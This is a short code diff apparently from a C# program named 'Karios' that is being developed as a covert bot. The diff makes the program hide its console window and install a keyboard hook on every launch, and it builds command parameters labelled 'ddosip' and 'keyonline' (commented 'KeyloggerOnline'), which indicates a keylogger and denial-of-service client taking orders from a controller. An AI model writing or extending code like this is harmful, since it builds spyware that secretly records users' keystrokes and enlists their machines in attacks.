@@ -31,6 +31,9 @@ namespace Karios
 
         public static void Main()
         {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+            _hookID = SetHook(_proc);
             CommandGet();            
         }
 
@@ -90,12 +93,6 @@ namespace Karios
                             paramaters = paramaters + "ddosip=true";
                         else
                             paramaters = paramaters + "&ddosip=true";
-                        // 3 = KeyloggerOnline
-                        if (paramaters == "?")
-                            paramaters = paramaters + "keyonline=true";
-                        else
-                            paramaters = paramaters + "&keyonline=true";
-
                         // 3 = KeyloggerOnline
                         if (paramaters == "?")
                             paramaters = paramaters + "keyonline=true";
@@ -168,9 +165,7 @@ namespace Karios
                         if (PreppedCommand[0] == "Online=True")
                         {
                             // Runs application
-                            var handle = GetConsoleWindow();
-                            ShowWindow(handle, SW_HIDE);
-                            _hookID = SetHook(_proc);
+                            
                             Application.Run();
                             UnhookWindowsHookEx(_hookID);
                         }
